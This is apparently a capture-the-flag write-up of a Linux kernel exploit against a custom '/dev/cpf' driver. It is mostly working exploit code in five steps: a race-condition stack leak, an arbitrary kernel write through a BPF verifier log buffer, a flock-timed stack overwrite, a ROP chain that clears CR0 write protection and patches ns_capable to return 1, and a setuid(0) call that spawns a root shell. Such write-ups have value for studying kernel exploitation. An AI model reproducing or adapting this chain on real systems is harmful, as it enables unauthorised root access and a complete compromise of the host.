1. info leak

uninitalized stack variable leak is possible by triggering race condition in load_attr function.

kernel module base and stack address can be leaked if MAP_LOOKUP_ELEM ioctl is called before the stack leak.

race window is very small. but chances to win the race can be increased by placing buffer at boundary of two pages.

ex) 0x100fff, 0x101000

```c
int load_attr(struct cpf_data __user *p) {
    struct cpf_data tmp;

    if (hardened_access_ok(VERIFY_READ, p, sizeof(struct cpf_data))) {
        // p is invalid because protection is PROT_NONE
        // __copy_from_user does not clear buffer on error
        __copy_from_user(&tmp, p, sizeof(struct cpf_data));

        write_lock(&g_buf_rwlock);
        memcpy(&g_buf, &tmp, sizeof(struct cpf_data));
        write_unlock(&g_buf_rwlock);
        return 0;
    }

	return -EFAULT;
}
```

```c
static noinline hardened_access_ok(int type, void *addr, size_t size) {
    unsigned char x = 0;
    int tmp = 0;

    if (!access_ok(type, addr, size)) // <------- any user address is ok
        return 0;

    // fails if addr is not really readable
    // race thread : mprotect(0x100000, 0x1000, PROT_READ);
    if (get_user(x, (unsigned char *)addr) || get_user(x, (unsigned char *)addr + size)) // <------- addr + size is on different page (check always passed)
        return 0;
    // race thread : mprotect(0x100000, 0x1000, PROT_NONE);

    if (type == VERIFY_WRITE) {
        get_user(x, (unsigned char *)addr);
        tmp |= put_user(x, (unsigned char *)addr);

        get_user(x, (unsigned char *)addr + size);
        tmp |= put_user(x, (unsigned char *)addr + size);

        if (tmp)
            return 0;
    }

    return 1;
}
```

<hr>

2. arbitrary write

arbitrary write bug in verifier.c line 4595

```c
if (log_level == 9) {
    memcpy(log_ubuf, env->prog->insns, 8);
    strcpy(log_ubuf + 8, "... : invalid instruction");
}
```
8 bytes of fully controlled data + dummy is copied to arbitrary address.

```c
void kwrite(unsigned long addr, unsigned long value) {
    int fd = open("/dev/cpf", 2);
    struct cpf_data buf;
    unsigned long prog[] = {
        value,
        0,
        0,
        0
    };
	size_t insns_cnt = sizeof(prog) / sizeof(struct bpf_insn);
    union bpf_attr battr = {
            .prog_type = BPF_PROG_TYPE_SOCKET_FILTER,
            .insns = prog,
            .insn_cnt = insns_cnt,
            .license = "N/A",
            .log_level = 9,
            .log_size = 128,
            .log_buf = addr,
            .kern_version = 0,
    };
    memset(&buf, 0, sizeof(buf));
    memcpy(&buf,&battr,48);
    ioctl(fd,0,&buf);
    ioctl(fd,PROG_LOAD,&buf);
    close(fd);
}
```

<hr>

3. arbitrary write to ROP

we need to trigger arbitrary write n-times before kernel thread returns.

to achieve this, we block thread (kernel stack address leaked) at kernel using flock. overwrite stack from other thread. after that, release the lock.

```c
static int *overwrite_stack(void *arg) {
    printf("overwrite_stack pid: %d\n", getpid());
    printf("overwrite_stack flock(LOCK_EX): %d\n", flock(lock_fd1, LOCK_EX));

    const unsigned long base_index = 20;

    unsigned long payload[] = {
        // ...
    };
        
    sleep(2);

    for(int i = base_index; i < base_index + sizeof(payload) / sizeof(unsigned long); i++) {
        kwrite(kstack_addr + i * 8, payload[i - base_index]);
    }

    printf("overwrite_stack flock(LOCK_UN): %d\n", flock(lock_fd1, LOCK_UN));
}

void kwrite_rop(unsigned long addr, unsigned long value) {
    if (!fork()) {
        signal(SIGCHLD, SIG_IGN);
        sleep(3);
    }
    else {
        kwrite_rop_addr = addr;
        kwrite_rop_value = value;

        lock_fd1 = open("/tmp/lock", O_WRONLY|O_CREAT|O_TRUNC, 0777);
        lock_fd2 = open("/tmp/lock", 0);

        printf("lock_fd1: %d\n", lock_fd1);
        printf("lock_fd2: %d\n", lock_fd2);
        printf("victim pid: %d\n", getpid());

        clone(overwrite_stack, overwrite_stack_thread_stack + STACK_SIZE, CLONE_VM, NULL);
        sleep(1);
        printf("flock: %d\n", flock(lock_fd2, LOCK_EX));
        exit(0);
    }
}
```

<hr>

4. overwrite kernel code

```c
unsigned long payload[] = {
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,
    kernel_base + 0x613DA,

    // pop rdi
    kernel_base + 0xFC18,
    0x0000000080050033 & ~CR0_WP,
    // native_write_cr0
    kernel_base + 0x62480,
    
    // pop rdi
    kernel_base + 0xFC18,
    (kwrite_rop_addr & 0xfffffffffffff000) - 0x1000,
    // pop rsi
    kernel_base + 0x310C,
    3,
    // set_memory_rw
    kernel_base + 0x6DF00,

    // pop rdi
    kernel_base + 0xFC18,
    kwrite_rop_addr,
    // pop rsi
    kernel_base + 0x310C,
    kwrite_rop_value,
    // mov [rdi], rsi
    kernel_base + 0x625A0,

    // crash to user
    kernel_base + 0xA00000,
    0
};
```

disable CR0_WP

set_memory_rw((ns_capable & 0xfffffffffffff000) - 0x1000, 3)

*ns_capable = 0xc3c0fec03148 (return 1)

by overwriting ns_capable, we virtually have all linux capabilities.

```c
SYSCALL_DEFINE1(setuid, uid_t, uid)
{
	struct user_namespace *ns = current_user_ns();
	const struct cred *old;
	struct cred *new;
	int retval;
	kuid_t kuid;

	kuid = make_kuid(ns, uid);
	if (!uid_valid(kuid))
		return -EINVAL;

	new = prepare_creds();
	if (!new)
		return -ENOMEM;
	old = current_cred();

	retval = -EPERM;
	if (ns_capable(old->user_ns, CAP_SETUID)) { 
      // if ns_capable returns 1 regardless of current capabilitiy?
        // any user can setuid to root!
		new->suid = new->uid = kuid;
		if (!uid_eq(kuid, old->uid)) {
			retval = set_user(new);
			if (retval < 0)
				goto error;
		}
	} else if (!uid_eq(kuid, old->uid) && !uid_eq(kuid, new->suid)) {
		goto error;
	}

	new->fsuid = new->euid = kuid;

	retval = security_task_fix_setuid(new, old, LSM_SETID_ID);
	if (retval < 0)
		goto error;

	return commit_creds(new);

error:
	abort_creds(new);
	return retval;
}

```

<hr>

5. get root shell

```c
// wait for ns_capable overwrite
while (setuid(0))
    sleep(1);

// done
setreuid(0, 0);
setregid(0, 0);
char *args[] = {"/bin/sh", NULL};
execve(args[0], args, NULL);
```
